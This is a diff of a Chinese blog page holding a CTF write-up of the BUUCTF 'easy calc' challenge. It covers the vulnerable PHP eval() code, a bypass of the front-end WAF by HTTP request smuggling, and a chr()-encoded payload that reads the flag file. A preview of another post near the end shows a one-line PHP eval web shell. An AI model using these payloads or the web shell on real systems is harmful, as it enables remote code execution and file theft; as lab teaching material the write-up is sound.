@@ -8,7 +8,10 @@
     <meta name="description" content="打开环境
 
 查看源代码
-123456789101112131415161718&amp;lt;!--I&#39;ve set up WAF to ensure security.--&amp;gt;&amp;lt;script&amp;gt;    $(&#39;#calc&#39;).subm">
+&amp;lt;!--I&#39;ve set up WAF to ensure security.--&gt;
+&amp;lt;script&gt;
+    $(&#39;#calc&#39;).submit(function(){
+        $.ajax({">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -476,7 +479,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    734
+                    724
                 </div>
                 
 
@@ -502,18 +505,57 @@
                 <p>打开环境<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/1.jpg" alt=""></p>
 <a id="more"></a>
 <p>查看源代码</p>
-<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--I<span class="string">'ve set up WAF to ensure security.--&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line">    $('#calc').submit(function(){</span><br><span class="line">        $.ajax({</span><br><span class="line">            url:<span class="string">"calc.php?num="</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">"#content"</span>).val()),</span><br><span class="line">            type:<span class="string">'GET'</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>{</span><br><span class="line">                $(<span class="string">"#result"</span>).html(<span class="string">`&lt;div class="alert alert-success"&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">${data}</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            },</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line">                alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">            }</span><br><span class="line">        })</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    })</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>I've <span class="token keyword">set</span> up WAF to ensure security<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>
+    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#calc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            url<span class="token punctuation">:</span><span class="token string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            type<span class="token punctuation">:</span><span class="token string">'GET'</span><span class="token punctuation">,</span>
+            success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;div class="alert alert-success">
+            &lt;strong>答案:&lt;/strong></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">
+            &lt;/div>`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span><span class="token punctuation">,</span>
+            error<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这啥?算不来!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
 <p>有一个<code>calc.php</code>,跟进去看看<br>发现waf代码</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>])){</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) {</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) {</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span> </code></pre>
 <p>waf过滤了’ ‘,’\t’,’\r’,’\n’,’'‘,’”‘,’`’,’[‘,’]’,’$’,’'<br>其中以get方式给num传参</p>
 <p>由于前端设置了waf，所以只要我们的访问请求中包含非法字符就会返回403，无法访问到后端<br>在这样的情况下我们就可以使用HTTP走私来绕过前端waf直接访问后端</p>
 <p>关于HTTP走私的介绍网上有许多师傅做了讲解，在这里就不多叙述了<br>(HTTP走私)[<a href="https://xz.aliyun.com/t/6654]" target="_blank" rel="noopener">https://xz.aliyun.com/t/6654]</a><br>(http请求走私(HTTP Request Smuggling))[<a href="https://blog.csdn.net/qq_37865996/article/details/102529396]" target="_blank" rel="noopener">https://blog.csdn.net/qq_37865996/article/details/102529396]</a><br>贴两个链接</p>
 <p>在这里，我们可以使用CL-CL方式来进行http走私，当然其他的方式也一样可以<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/2.jpg" alt=""><br>前端服务器读取完num=1之后，将数据包原封不动地转发给后端，后端读取到<code>?num=phpinfo()</code>后，返回给我们<code>phpinfo()</code><br>在这一题里有几个PHP函数需要我们注意</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scandir() 函数</span><br><span class="line">返回指定目录中的文件和目录的数组。</span><br><span class="line">var_dump()函数：var_dump() 函数用于输出变量的相关信息。</span><br><span class="line">var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</span><br><span class="line">readfile() 函数</span><br><span class="line">输出一个文件。</span><br><span class="line">该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回<span class="literal">false</span>。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">scandir<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数
+返回指定目录中的文件和目录的数组。
+var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span>函数：var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数用于输出变量的相关信息。
+var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。
+readfile<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数
+输出一个文件。
+该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回false。您可以通过 @readfile<span class="token punctuation">(</span><span class="token punctuation">)</span> 形式调用该函数，来隐藏错误信息。</code></pre>
 <p>我们可以使用<code>scandir("\")</code>来扫描根目录，但””被禁了，所以这样子不行，我们可以把\转为ASCII码，然后再转为字符，</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chr()</span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">chr<span class="token punctuation">(</span><span class="token punctuation">)</span>
+chr<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数从指定的 ASCII 值返回字符。
+ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。</code></pre>
 <p>所以我们可以构造成<code>scandir(chr(47))</code>来扫描根目录<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/3.jpg" alt=""><br>找到了flag存放的目录<br>接下来，我们需要从f1agg目录中读取flag<br>构造payload</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">?num<span class="token operator">=</span>var_dump<span class="token punctuation">(</span>readfile<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>47<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>102<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>49<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>97<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>103<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>103<span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre>
 <p><code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code>就是/f1agg<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/4.jpg" alt=""><br>flag到手</p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -790,7 +832,10 @@
                             打开环境，是一个文件上传页面
 
 先查看一下源代码，看看有没有客户端校验显然没有客户端校验首先上传一个图片，检查上传功能图片正常上传接下来再上传一个php文件
-123&lt;?php @eval($_POST['shell']); ?&gt;
+&lt;?php 
+@eval($_POST['shell']);
+ ?>
+提示非
                         
                     </div>
                     <div class="publish-info">
